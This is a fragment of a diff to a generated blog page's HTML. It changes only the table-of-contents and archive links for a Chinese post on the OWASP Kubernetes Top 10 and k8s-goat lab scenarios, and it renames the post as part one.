-Centralized Policy Enforcement</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-3"><span class="toc-number">3.4.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%BA%94k8s-goat%E5%9C%BA%E6%99%AF-1"><span class="toc-number">3.4.2.</span> <span class="toc-text">对应k8s-goat场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-3"><span class="toc-number">3.4.3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E5%8E%9F%E5%9B%A0-3"><span class="toc-number">3.4.4.</span> <span class="toc-text">问题原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%AD%A6%E4%B9%A0-3"><span class="toc-number">3.4.5.</span> <span class="toc-text">参考学习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#k05-inadequate-logging-and-monitoring"><span class="toc-number">3.5.</span> <span class="toc-text">K05: Inadequate Logging
-and Monitoring</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-4"><span class="toc-number">3.5.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%BA%94k8s-goat%E5%9C%BA%E6%99%AF-2"><span class="toc-number">3.5.2.</span> <span class="toc-text">对应k8s-goat场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-4"><span class="toc-number">3.5.3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E5%8E%9F%E5%9B%A0-4"><span class="toc-number">3.5.4.</span> <span class="toc-text">问题原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%AD%A6%E4%B9%A0-4"><span class="toc-number">3.5.5.</span> <span class="toc-text">参考学习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#k06-broken-authentication-mechanisms"><span class="toc-number">3.6.</span> <span class="toc-text">K06: Broken Authentication
-Mechanisms</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-5"><span class="toc-number">3.6.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%BA%94k8s-goat%E5%9C%BA%E6%99%AF-3"><span class="toc-number">3.6.2.</span> <span class="toc-text">对应k8s-goat场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-5"><span class="toc-number">3.6.3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E5%8E%9F%E5%9B%A0-5"><span class="toc-number">3.6.4.</span> <span class="toc-text">问题原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%AD%A6%E4%B9%A0-5"><span class="toc-number">3.6.5.</span> <span class="toc-text">参考学习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#k07-missing-network-segmentation-controls"><span class="toc-number">3.7.</span> <span class="toc-text">K07: Missing Network
-Segmentation Controls</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-6"><span class="toc-number">3.7.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%BA%94k8s-goat%E5%9C%BA%E6%99%AF-4"><span class="toc-number">3.7.2.</span> <span class="toc-text">对应k8s-goat场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-6"><span class="toc-number">3.7.3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E5%8E%9F%E5%9B%A0-6"><span class="toc-number">3.7.4.</span> <span class="toc-text">问题原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%AD%A6%E4%B9%A0-6"><span class="toc-number">3.7.5.</span> <span class="toc-text">参考学习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#k08-secrets-management-failures"><span class="toc-number">3.8.</span> <span class="toc-text">K08: Secrets Management
-Failures</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-7"><span class="toc-number">3.8.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%BA%94k8s-goat%E5%9C%BA%E6%99%AF-5"><span class="toc-number">3.8.2.</span> <span class="toc-text">对应k8s-goat场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-7"><span class="toc-number">3.8.3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E5%8E%9F%E5%9B%A0-7"><span class="toc-number">3.8.4.</span> <span class="toc-text">问题原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%AD%A6%E4%B9%A0-7"><span class="toc-number">3.8.5.</span> <span class="toc-text">参考学习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#k09-misconfigured-cluster-components"><span class="toc-number">3.9.</span> <span class="toc-text">K09: Misconfigured Cluster
-Components</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-8"><span class="toc-number">3.9.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%BA%94k8s-goat%E5%9C%BA%E6%99%AF-6"><span class="toc-number">3.9.2.</span> <span class="toc-text">对应k8s-goat场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-8"><span class="toc-number">3.9.3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E5%8E%9F%E5%9B%A0-8"><span class="toc-number">3.9.4.</span> <span class="toc-text">问题原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%AD%A6%E4%B9%A0-8"><span class="toc-number">3.9.5.</span> <span class="toc-text">参考学习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#k10-outdated-and-vulnerable-kubernetes-components"><span class="toc-number">3.10.</span> <span class="toc-text">K10: Outdated
-and Vulnerable Kubernetes Components</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-9"><span class="toc-number">3.10.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%BA%94k8s-goat%E5%9C%BA%E6%99%AF-7"><span class="toc-number">3.10.2.</span> <span class="toc-text">对应k8s-goat场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-9"><span class="toc-number">3.10.3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E5%8E%9F%E5%9B%A0-9"><span class="toc-number">3.10.4.</span> <span class="toc-text">问题原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%AD%A6%E4%B9%A0-9"><span class="toc-number">3.10.5.</span> <span class="toc-text">参考学习</span></a></li></ol></li></ol></li></ol>
+private registry</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86%E5%85%B3%E4%BA%8Edocker-registry"><span class="toc-number">3.2.3.</span> <span class="toc-text">预备知识：关于docker registry</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">3.2.4.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E5%8E%9F%E5%9B%A0-1"><span class="toc-number">3.2.5.</span> <span class="toc-text">问题原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%AD%A6%E4%B9%A0-1"><span class="toc-number">3.2.6.</span> <span class="toc-text">参考学习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#k03-overly-permissive-rbac"><span class="toc-number">3.3.</span> <span class="toc-text">K03: Overly Permissive RBAC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-2"><span class="toc-number">3.3.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%BA%94k8s-goat%E5%9C%BA%E6%99%AFrbac-least-privileges-misconfiguration"><span class="toc-number">3.3.2.</span> <span class="toc-text">对应k8s-goat场景：RBAC
+least privileges misconfiguration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86"><span class="toc-number">3.3.3.</span> <span class="toc-text">预备知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-2"><span class="toc-number">3.3.4.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E5%8E%9F%E5%9B%A0-2"><span class="toc-number">3.3.5.</span> <span class="toc-text">问题原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%AD%A6%E4%B9%A0-2"><span class="toc-number">3.3.6.</span> <span class="toc-text">参考学习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#k04-lack-of-centralized-policy-enforcement"><span class="toc-number">3.4.</span> <span class="toc-text">K04: Lack of
+Centralized Policy Enforcement</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-3"><span class="toc-number">3.4.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%BA%94k8s-goat%E5%9C%BA%E6%99%AFsecuring-kubernetes-clusters-using-kyverno-policy-engine"><span class="toc-number">3.4.2.</span> <span class="toc-text">对应k8s-goat场景：Securing
+Kubernetes Clusters using Kyverno Policy Engine</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-3"><span class="toc-number">3.4.3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E5%8E%9F%E5%9B%A0-3"><span class="toc-number">3.4.4.</span> <span class="toc-text">问题原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%AD%A6%E4%B9%A0-3"><span class="toc-number">3.4.5.</span> <span class="toc-text">参考学习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#k05-inadequate-logging-and-monitoring"><span class="toc-number">3.5.</span> <span class="toc-text">K05: Inadequate Logging
+and Monitoring</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-4"><span class="toc-number">3.5.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%BA%94k8s-goat%E5%9C%BA%E6%99%AF"><span class="toc-number">3.5.2.</span> <span class="toc-text">对应k8s-goat场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-4"><span class="toc-number">3.5.3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E5%8E%9F%E5%9B%A0-4"><span class="toc-number">3.5.4.</span> <span class="toc-text">问题原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%AD%A6%E4%B9%A0-4"><span class="toc-number">3.5.5.</span> <span class="toc-text">参考学习</span></a></li></ol></li></ol></li></ol>
             </div>
         
         <!-- sidebar -->
@@ -2561,7 +2696,7 @@ and Vulnerable Kubernetes Components</span></a><ol class="toc-child"><li class="
         
         <li class="archive-post-item">
             <span class="archive-post-date">09/16</span>
-            <a class="archive-post-title" href="/posts/8aa36aba.html">K8s攻防之OWASP-K8S-TOP10</a>
+            <a class="archive-post-title" href="/posts/8aa36aba.html">K8s攻防之OWASP-K8S-TOP10（上）</a>
         </li>
     
         
